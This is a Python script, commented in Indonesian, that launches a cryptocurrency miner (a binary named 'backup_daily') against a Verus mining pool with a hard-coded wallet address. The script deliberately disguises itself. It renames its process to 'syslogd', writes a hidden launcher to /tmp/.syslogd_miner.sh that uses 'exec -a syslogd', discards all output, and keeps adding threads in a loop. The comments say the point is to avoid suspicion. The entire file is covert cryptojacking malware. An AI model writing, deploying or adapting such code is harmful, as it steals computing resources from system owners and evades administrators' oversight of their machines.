import os
import subprocess
import time
import random
import ctypes

def set_process_name(name="syslogd"):
    """Mengubah nama proses agar tidak mencurigakan"""
    try:
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, bytes(name, "utf-8"), 0, 0, 0)
    except Exception as e:
        print(f"Gagal mengubah nama proses: {e}")

def get_numa_info():
    """Mengambil informasi NUMA node dan CPU yang tersedia"""
    try:
        result = subprocess.run(["numactl", "--hardware"], capture_output=True, text=True)
        lines = result.stdout.split("\n")
        numa_info = {}

        for line in lines:
            if "node" in line and "cpus" in line:
                parts = line.split()
                node_id = int(parts[1])
                cpu_list = [int(cpu) for cpu in parts[3:]]
                numa_info[node_id] = cpu_list
        
        return numa_info
    except Exception as e:
        print(f"Error mendapatkan info NUMA: {e}")
        return {}

def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
    """Menjalankan proses mining dengan NUMA terbatas dan hidden process tanpa cpulimit"""
    set_process_name("syslogd")  # Ubah nama proses agar tidak mencurigakan
    numa_info = get_numa_info()
    
    if numa_node not in numa_info:
        print(f"NUMA node {numa_node} tidak ditemukan!")
        return
    
    total_cpus = len(numa_info[numa_node])
    limited_cpus = max(1, int((limit_percent / 100) * total_cpus))
    selected_cpus = ",".join(map(str, numa_info[numa_node][:limited_cpus]))
    
    threads = initial_threads
    
    while True:
        command = f"./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t {threads}"
        
        print(f"Menjalankan mining secara tersembunyi pada NUMA node {numa_node} dengan {limited_cpus}/{total_cpus} CPU ({limit_percent}%) dan {threads} thread")
        
        # Buat skrip sementara untuk menjalankan mining dengan nama lain
        script_content = f"""#!/bin/bash
        exec -a syslogd {command}
        """
        script_path = "/tmp/.syslogd_miner.sh"
        
        with open(script_path, "w") as script_file:
            script_file.write(script_content)
        os.chmod(script_path, 0o755)
        
        # Jalankan proses mining dengan NUMA binding tanpa cpulimit
        subprocess.Popen(
            f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {script_path} > /dev/null 2>&1 &",
            shell=True
        )
        
        sleep_time = random.randint(55, 60)
        time.sleep(sleep_time)
        
        print(f"Mining dihentikan selama {sleep_time} detik. Melanjutkan dalam 10 detik...")
        time.sleep(10)
        
        threads += 1  # Tambah jumlah thread setiap kali mining dihentikan

start_mining(numa_node=0, limit_percent=80, initial_threads=1)
